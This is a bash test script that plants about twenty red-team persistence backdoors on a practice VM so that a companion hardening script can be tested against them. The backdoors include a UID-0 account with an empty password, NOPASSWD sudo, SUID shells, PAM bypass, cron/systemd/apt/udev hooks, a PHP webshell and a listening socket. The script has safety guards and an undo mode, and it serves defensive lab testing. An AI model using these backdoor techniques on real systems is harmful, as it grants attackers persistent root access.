#!/usr/bin/env bash
# plant.sh - simulate common red-team persistence on a PRACTICE VM so you can see lockdown.sh catch it.
# Never run this anywhere but a throwaway VM: it adds real backdoors (they point at /tmp/.x, which doesn't exist).
#   sudo tests/plant.sh          plant
#   sudo tests/plant.sh --undo   remove what was planted (or just revert the VM snapshot)
[[ $EUID -eq 0 ]] || { echo "run as root"; exit 1; }
# Lab tools only: they plant backdoors and create FAKE Wazuh/Xen units. On competition boxes that would break
# R14/R15 (impersonating staff tools) and R24 (test outside competition infrastructure). Competition boxes are
# Xen VMs, so "is it a VM" isn't enough: refuse on Xen, on playtcdc.org names, and on competition hostnames.
virt="$(systemd-detect-virt 2>/dev/null || echo none)"
fqdn="$(hostname -f 2>/dev/null) $(grep -hE '^(search|domain)' /etc/resolv.conf 2>/dev/null | tr '\n' ' ')"
if [[ "$virt" == xen || "$fqdn" == *playtcdc* || "$(hostname -s)" =~ ^(ns1|ipcam|ftp-archive|artifactorium|ssh-workstation|jumpbox|ad|mqtt|opnsense)$ && "${LAB_OK:-0}" != 1 ]]; then
  echo "this looks like COMPETITION infrastructure (Xen VM, playtcdc.org name or a competition hostname): refusing (R14/R24)."
  echo "In your own Multipass lab with competition hostnames, run with LAB_OK=1."; exit 1
fi
[[ "$virt" == xen || "$fqdn" == *playtcdc* ]] && { echo "refusing on Xen / playtcdc.org even with LAB_OK=1"; exit 1; }
if [[ "$virt" == none && "${FORCE:-0}" != 1 ]]; then echo "this looks like a REAL machine, not a VM: refusing (it adds users/backdoors and hardens for real). Use tests/lab-up.sh to make VMs."; exit 1; fi
PY="$(readlink -f "$(command -v python3)")"

if [[ "${1:-}" == --undo ]]; then
  pkill -f 'bind\(\("0.0.0.0",31337' 2>/dev/null
  userdel -r redteam 2>/dev/null; sed -i '/^toor:/d' /etc/passwd /etc/shadow   # never userdel a UID 0 account
  usermod -s /usr/sbin/nologin www-data; gpasswd -d streep lxd 2>/dev/null; usermod -g franklin franklin 2>/dev/null
  sed -i '/redteam-key/d' /root/.ssh/authorized_keys 2>/dev/null
  rm -f /etc/cron.d/sysupdate /var/tmp/.sh /etc/update-motd.d/99-x /etc/apt/apt.conf.d/99x /etc/sudoers.d/zz \
        /var/www/html/x.php /etc/udev/rules.d/99-x.rules /etc/ssh/sshd_config.d/0-redteam.conf /etc/systemd/system/sysmon.service
  rm -rf /etc/systemd/system/cron.service.d
  sed -i '/^alias sudo=/d' /root/.bashrc; sed -i '1{/pam_permit/d}' /etc/pam.d/common-auth
  setcap -r "$PY" 2>/dev/null; chmod u-s "$(readlink -f "$(command -v find)")"
  systemctl daemon-reload 2>/dev/null; echo "unplanted"; exit 0
fi

useradd -m -s /bin/bash redteam && echo "redteam:Redteam-1" | chpasswd             # new user
usermod -aG sudo redteam                                                            # ... with sudo
echo 'redteam ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/zz; chmod 440 /etc/sudoers.d/zz
echo 'toor:x:0:0::/root:/bin/bash' >> /etc/passwd; echo 'toor::19000:0:99999:7:::' >> /etc/shadow   # UID 0, empty password
usermod -s /bin/bash www-data                                                       # service account gets a shell
id streep >/dev/null 2>&1 && { getent group lxd >/dev/null || groupadd lxd; usermod -aG lxd streep; }   # root-equivalent group
id franklin >/dev/null 2>&1 && usermod -g sudo franklin                             # PRIMARY group sudo (invisible in group list)
mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOn1y7cN0t4r34lk3yN0t4r34lk3yN0t4r34lk3yN0t4 redteam-key" >> /root/.ssh/authorized_keys
echo "* * * * * root /tmp/.x" > /etc/cron.d/sysupdate                               # system cron
echo "*/5 * * * * /tmp/.x" | crontab -u redteam -                                   # user crontab
cp "$(readlink -f /bin/bash)" /var/tmp/.sh && chmod u+s /var/tmp/.sh                 # SUID shell
chmod u+s "$(readlink -f "$(command -v find)")"                                      # SUID on a packaged GTFObin
setcap cap_setuid+ep "$PY"                                                           # capability backdoor
echo "alias sudo='sudo /tmp/.x'" >> /root/.bashrc                                    # dotfile
sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/common-auth                     # PAM: any password works
mkdir -p /etc/systemd/system/cron.service.d
printf '[Service]\nExecStartPost=/tmp/.x\n' > /etc/systemd/system/cron.service.d/override.conf   # drop-in hijack
printf '[Unit]\nDescription=System monitor\n[Service]\nExecStart=/tmp/.x\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sysmon.service
echo 'echo hi; /tmp/.x' > /etc/update-motd.d/99-x && chmod +x /etc/update-motd.d/99-x   # runs at SSH login
echo 'APT::Update::Pre-Invoke {"/tmp/.x";};' > /etc/apt/apt.conf.d/99x                 # runs on apt update
mkdir -p /etc/udev/rules.d; echo 'ACTION=="add", RUN+="/tmp/.x"' > /etc/udev/rules.d/99-x.rules                    # udev
printf 'PermitRootLogin yes\nPermitEmptyPasswords yes\n' > /etc/ssh/sshd_config.d/0-redteam.conf   # beats 00-lockdown.conf
[[ -d /var/www/html ]] && echo '<?php system($_GET["c"]); ?>' > /var/www/html/x.php     # webshell
nohup python3 -c 'import socket,time;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",31337));s.listen();time.sleep(99999)' >/dev/null 2>&1 &
systemctl daemon-reload 2>/dev/null
echo "planted 22 tricks. Run: sudo ./lockdown.sh --diff   and   sudo ./lockdown.sh --audit"
